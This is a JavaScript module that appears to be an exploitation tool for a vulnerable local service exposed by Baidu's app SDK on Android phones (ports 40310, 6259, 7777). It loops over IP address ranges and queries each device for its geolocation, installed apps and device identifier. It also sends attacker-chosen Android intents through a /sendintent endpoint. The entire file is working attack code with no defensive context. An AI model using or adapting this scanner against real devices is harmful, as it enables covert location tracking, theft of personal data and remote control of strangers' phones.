net=require('./netInfrastructure');

exports.BAIDU_PORT1=40310;
exports.BAIDU_PORT2=6259;
exports.BAIDU_PORT3=7777;

function GetGeolocation(hostname, port, args, callback, onError)
{
    net.MakeGet(hostname, port, "/geolocation?mcmdf=inapp_", callback, onError);
}
function GetAppList(hostname, port, args, callback, onError)
{
    net.MakeGet(hostname, port, "/getapplist?mcmdf=inapp_&callback=jsonp1", callback, onError);
}
function GetCUID(hostname, port, args, callback, onError)
{
    net.MakeGet(hostname, port, "/getcuid?mcmdf=inapp_&callback=jsonp1", callback, onError);
}
function SendIntent(hostname, port, args, callback, onError)
{
    var c=args["sdic"];
    if (c==null || c.length==0)
    {
        onError(new Error('No Send Intent Content Specified.'));
        return;
    }
    net.MakeGet(hostname, port, "/sendintent?mcmdf=inapp_&callback=jsonp1&intent="+c[0], callback, onError);
}

exports.Func={
    "geo":      GetGeolocation,
    "apps":     GetAppList,
    "sdi":      SendIntent,
    "cuid":     GetCUID
};

exports.Go=
function(methodName, hostname, port, args, callback)
{
    var totalCount=1;
    var result={};
    function onFinishGenor(id)
    {
        return function(data)
        {
            result[id]=[1, data];
            totalCount--;
            if (totalCount==0)
                callback(result);
        };
    }
    function onErrorGenor(id)
    {
        return function(err)
        {
            result[id]=[0, err];
            totalCount--;
            if (totalCount==0)
                callback(result);
        };
    }

    while (true)
    {
        var thisIp=hostname.next();
        if (thisIp==null)
            break;
        totalCount++;
        this.Func[methodName](thisIp, port, args, onFinishGenor(thisIp), onErrorGenor(thisIp));
    }
    totalCount--;
    if (totalCount==0)
        callback(result);
}
